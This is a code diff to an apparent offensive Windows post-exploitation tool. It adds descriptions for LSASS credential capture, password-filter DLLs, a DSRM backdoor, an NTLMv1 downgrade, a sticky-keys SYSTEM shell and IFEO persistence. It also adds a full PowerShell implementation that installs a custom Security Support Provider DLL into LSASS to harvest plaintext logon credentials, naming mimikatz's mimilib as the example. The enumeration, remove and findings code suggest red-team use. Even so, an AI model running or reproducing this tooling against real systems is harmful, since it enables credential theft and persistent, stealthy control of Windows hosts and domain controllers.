@@ -642,6 +642,36 @@ const PROGRAMS = {
       "Constrained Language Mode (CLM) bypass — escape PowerShell CLM restrictions using multiple techniques: custom .NET runspace, MSBuild inline tasks, InstallUtil, XSLT transforms, Add-Type with in-memory compilation. More comprehensive than ps_downgrade (PS 2.0 only). Check current language mode, attempt bypass, execute arbitrary PowerShell in FullLanguage mode",
     args: "--action check|bypass|execute [--method runspace|msbuild|installutil|xslt|addtype] [--command CMD] [--script-path PATH]",
   },
+  ssp_persist: {
+    description:
+      "Security Support Provider (SSP) persistence — register a custom SSP DLL that loads into LSASS and captures ALL plaintext credentials on every logon (interactive, network, service). More powerful than WDigest (captures every auth type). Uses AddSecurityPackage API (instant, no reboot) or registry (survives reboot). Enumerate existing SSPs, install, and remove",
+    args: "--action enum|install|remove [--dll DLL_PATH] [--name SSP_NAME] [--method api|registry]",
+  },
+  password_filter: {
+    description:
+      "Password filter DLL persistence — register a custom notification DLL that receives plaintext passwords on EVERY password change (user-initiated, admin reset, group policy). Loaded by LSASS via LSA Notification Packages registry key. Complements ssp_persist (SSP captures logons, this captures password changes). Enumerate, install, and remove",
+    args: "--action enum|install|remove [--dll DLL_PATH] [--name FILTER_NAME]",
+  },
+  dsrm_abuse: {
+    description:
+      "Directory Services Restore Mode (DSRM) abuse — exploit the local DSRM administrator account on Domain Controllers for persistent backdoor access. Check DSRM password status, set DsrmAdminLogonBehavior to allow network logon (value 2), sync DSRM password with a domain account. Stealthier than skeleton_key and survives reboots",
+    args: "--action check|enable-network|sync-password|disable [--sync-account ACCOUNT]",
+  },
+  ntlmv1_downgrade: {
+    description:
+      "NTLMv1 authentication downgrade — force NTLMv1 responses by modifying LmCompatibilityLevel registry value. NTLMv1 hashes crack instantly (rainbow tables / DES key space) vs NTLMv2 which requires bruteforce. Combine with ntlm_coerce/coercer_full to capture easily-crackable hashes. Check current level, downgrade, and restore",
+    args: "--action check|downgrade|restore [--level 0|1|2] [--target HOST]",
+  },
+  accessibility_backdoor: {
+    description:
+      "Accessibility features backdoor — replace sethc.exe (Sticky Keys), utilman.exe (Utility Manager), narrator.exe, or osk.exe with cmd.exe for SYSTEM shell at the Windows login screen. Press Shift 5 times (sethc) or Win+U (utilman) at RDP login to get SYSTEM. Classic persistence technique, works without Credential Guard",
+    args: "--action check|install|remove [--target sethc|utilman|narrator|osk|magnify] [--payload CMD_PATH]",
+  },
+  ifeo_persist: {
+    description:
+      "Image File Execution Options (IFEO) debugger persistence — set a debugger for any executable so your payload runs instead when the target process launches. Supports standard debugger key (visible) and SilentProcessExit monitoring (stealthier, triggers on process exit). Enumerate existing IFEO entries, install, and remove",
+    args: "--action enum|install|remove [--target PROCESS.exe] [--payload PATH] [--method debugger|silent-exit]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -22750,6 +22780,296 @@ if (Test-Path $exePath) {
   return { output: output.join("\n"), findings }
 }
 
+async function sspPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const dll = argVal(args, "--dll")
+  const name = argVal(args, "--name") || "CyberStrikeSSP"
+  const method = argVal(args, "--method") || "api"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Security Support Provider (SSP) operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Registered Security Support Providers ==="
+Write-Output ""
+
+# Registry SSPs (loaded on boot)
+$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$ssps = (Get-ItemProperty $sspKey -Name 'Security Packages' -ErrorAction SilentlyContinue).'Security Packages'
+Write-Output "Registry SSPs (HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages):"
+$sspCount = 0
+foreach ($s in $ssps) {
+  if ($s.Trim()) {
+    $sspCount++
+    $dllPath = "$env:SystemRoot\\System32\\$s.dll"
+    $exists = Test-Path $dllPath
+    $sig = if ($exists) { (Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue).Status } else { 'N/A' }
+    $signed = if ($sig -eq 'Valid') { 'Signed' } else { 'UNSIGNED [!]' }
+    Write-Output "  $s — $(if ($exists) { "$signed" } else { 'DLL NOT FOUND [!]' })"
+  }
+}
+Write-Output "SSP_COUNT=$sspCount"
+Write-Output ""
+
+# OSConfig SSPs
+$osConfig = (Get-ItemProperty $sspKey -Name 'OSConfig\\Security Packages' -ErrorAction SilentlyContinue)
+if ($osConfig) {
+  Write-Output "OSConfig SSPs:"
+  foreach ($s in $osConfig.'Security Packages') {
+    if ($s.Trim()) { Write-Output "  $s" }
+  }
+  Write-Output ""
+}
+
+# Currently loaded SSPs (via EnumerateSecurityPackages)
+Write-Output "=== Currently Loaded Security Packages ==="
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class SSPEnum {
+  [DllImport("secur32.dll")]
+  public static extern int EnumerateSecurityPackagesW(out int pcPackages, out IntPtr ppPackageInfo);
+  [DllImport("secur32.dll")]
+  public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
+
+  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+  public struct SecPkgInfo {
+    public int fCapabilities;
+    public short wVersion;
+    public short wRPCID;
+    public int cbMaxToken;
+    public string Name;
+    public string Comment;
+  }
+
+  public static string[] GetPackages() {
+    int count; IntPtr buf;
+    if (EnumerateSecurityPackagesW(out count, out buf) == 0) {
+      var names = new string[count];
+      int size = Marshal.SizeOf(typeof(SecPkgInfo));
+      for (int i = 0; i < count; i++) {
+        var info = (SecPkgInfo)Marshal.PtrToStructure(IntPtr.Add(buf, i * size), typeof(SecPkgInfo));
+        names[i] = info.Name;
+      }
+      FreeContextBuffer(buf);
+      return names;
+    }
+    return new string[0];
+  }
+}
+"@ -ErrorAction SilentlyContinue
+
+try {
+  $loaded = [SSPEnum]::GetPackages()
+  foreach ($p in $loaded) { Write-Output "  $p" }
+  Write-Output ""
+  Write-Output "LOADED_COUNT=$($loaded.Length)"
+} catch {
+  Write-Output "  (enumeration requires Add-Type — may be blocked by CLM)"
+}
+
+# Check for known malicious SSPs
+Write-Output ""
+Write-Output "=== Suspicious SSP Check ==="
+$known = @('kerberos', 'msv1_0', 'schannel', 'wdigest', 'tspkg', 'pku2u', 'cloudap', 'negoexts', 'negotiate')
+$suspicious = 0
+foreach ($s in $ssps) {
+  $trimmed = $s.Trim().ToLower()
+  if ($trimmed -and $trimmed -notin $known) {
+    Write-Output "[!] Non-standard SSP: $s"
+    $suspicious++
+  }
+}
+if ($suspicious -eq 0) { Write-Output "[*] All SSPs appear standard" }
+Write-Output "SUSPICIOUS=$suspicious"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const suspicious = r.stdout.match(/SUSPICIOUS=(\d+)/)
+    if (suspicious && parseInt(suspicious[1]) > 0) {
+      findings.push({
+        checkId: "WIN-SSP-001",
+        provider: "windows",
+        severity: "critical",
+        status: "SUSPICIOUS",
+        resource: "lsa://ssp",
+        title: `${suspicious[1]} non-standard SSP(s) found — possible credential capture`,
+        details: "Non-standard Security Support Providers in LSASS may be capturing plaintext credentials on every logon.",
+        remediation: "Review and remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dll) {
+      output.push("ERROR: --dll required (path to SSP DLL)")
+      output.push("")
+      output.push("The SSP DLL must export:")
+      output.push("  - SpLsaModeInitialize (SSP/AP interface)")
+      output.push("")
+      output.push("Example SSPs for credential capture:")
+      output.push("  - mimilib.dll (mimikatz SSP — logs to kiwissp.log)")
+      output.push("  - Custom DLL that hooks SpAcceptCredentials")
+      output.push("")
+      output.push("Two installation methods:")
+      output.push("  --method api      — AddSecurityPackage (instant, no reboot, but lost on reboot)")
+      output.push("  --method registry — Registry + reboot (persistent across reboots)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing SSP ==="
+Write-Output "DLL: ${dll}"
+Write-Output "Name: ${name}"
+Write-Output "Method: ${method}"
+Write-Output ""
+
+# Verify admin
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+  Write-Output "[-] Administrator privileges required"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Copy DLL to System32
+$dllName = [System.IO.Path]::GetFileNameWithoutExtension('${dll}')
+$dllFile = [System.IO.Path]::GetFileName('${dll}')
+$destPath = "$env:SystemRoot\\System32\\$dllFile"
+if (-not (Test-Path $destPath)) {
+  Copy-Item '${dll}' $destPath -Force
+  Write-Output "[+] DLL copied to: $destPath"
+} else {
+  Write-Output "[*] DLL already exists at: $destPath"
+}
+
+${method === "api" ? `
+# Method 1: AddSecurityPackage API (instant, no reboot)
+Write-Output ""
+Write-Output "[*] Loading SSP via AddSecurityPackage..."
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class SSPLoader {
+  [StructLayout(LayoutKind.Sequential)]
+  public struct SECURITY_PACKAGE_OPTIONS {
+    public int Size;
+    public int Type;
+    public int Flags;
+    public int SignatureSize;
+    public IntPtr Signature;
+  }
+  [DllImport("secur32.dll", SetLastError = true)]
+  public static extern int AddSecurityPackageW(
+    [MarshalAs(UnmanagedType.LPWStr)] string pszPackageName,
+    ref SECURITY_PACKAGE_OPTIONS pOptions);
+}
+"@ -ErrorAction SilentlyContinue
+
+try {
+  $opts = New-Object SSPLoader+SECURITY_PACKAGE_OPTIONS
+  $opts.Size = [System.Runtime.InteropServices.Marshal]::SizeOf($opts)
+  $result = [SSPLoader]::AddSecurityPackageW("$dllName", [ref]$opts)
+  if ($result -eq 0) {
+    Write-Output "[+] SSP loaded successfully via API"
+    Write-Output "[+] Credentials will be captured on next logon"
+    Write-Output "[!] Note: API method does NOT survive reboot"
+    Write-Output "[*] For persistence, also run with --method registry"
+    Write-Output "STATUS=SUCCESS"
+  } else {
+    Write-Output "[-] AddSecurityPackage returned: 0x$($result.ToString('X8'))"
+    Write-Output "STATUS=PARTIAL"
+  }
+} catch {
+  Write-Output "[-] API method failed: $_"
+  Write-Output "[*] Falling back to registry method..."
+  Write-Output "STATUS=FALLBACK"
+}
+` : ""}
+
+${method === "registry" || method !== "api" ? `
+# Method 2: Registry (persistent, requires reboot or API call to take effect)
+Write-Output ""
+Write-Output "[*] Adding SSP to registry..."
+$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $sspKey -Name 'Security Packages').'Security Packages'
+if ($dllName -notin $current) {
+  $updated = $current + $dllName
+  Set-ItemProperty $sspKey -Name 'Security Packages' -Value $updated
+  Write-Output "[+] Added '$dllName' to Security Packages registry"
+  Write-Output "[+] SSP will load into LSASS on next boot"
+  Write-Output "[!] Reboot required for registry method (or use --method api for instant)"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[*] '$dllName' already in Security Packages"
+  Write-Output "STATUS=EXISTS"
+}
+` : ""}
+
+Write-Output ""
+Write-Output "[*] After installation, credentials are logged to:"
+Write-Output "    - mimilib.dll: C:\\Windows\\System32\\kiwissp.log"
+Write-Output "    - Custom DLL: depends on implementation"
+Write-Output ""
+Write-Output "Cleanup: winhook ssp_persist --action remove --name $dllName"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-SSP-010",
+        provider: "windows",
+        severity: "critical",
+        status: "INSTALLED",
+        resource: `lsa://ssp/${name}`,
+        title: `SSP credential capture installed: ${name}`,
+        details: `SSP DLL registered via ${method}. All future logon credentials will be captured in plaintext by LSASS.`,
+        remediation: `Remove: winhook ssp_persist --action remove --name ${name}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const targetName = argVal(args, "--name") || name
+    const script = `
+Write-Output "=== Removing SSP ==="
+
+$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $sspKey -Name 'Security Packages').'Security Packages'
+$filtered = $current | Where-Object { $_.Trim() -ne '${targetName}' }
+
+if ($filtered.Count -lt $current.Count) {
+  Set-ItemProperty $sspKey -Name 'Security Packages' -Value $filtered
+  Write-Output "[+] Removed '${targetName}' from Security Packages registry"
+} else {
+  Write-Output "[*] '${targetName}' not found in Security Packages"
+}
+
+# Remove DLL
+$dllPath = "$env:SystemRoot\\System32\\${targetName}.dll"
+if (Test-Path $dllPath) {
+  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] DLL removed: $dllPath"
+}
+
+# Remove log file if mimilib
+$logPath = "$env:SystemRoot\\System32\\kiwissp.log"
+if (Test-Path $logPath) {
+  Remove-Item $logPath -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] Credential log removed: $logPath"
+}
+
+Write-Output "[+] SSP removed (reboot may be needed to fully unload from LSASS)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -26387,6 +26707,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   rdp_shadow: rdpShadow,
   print_monitor_persist: printMonitorPersist,
   clm_bypass: clmBypass,
+  ssp_persist: sspPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
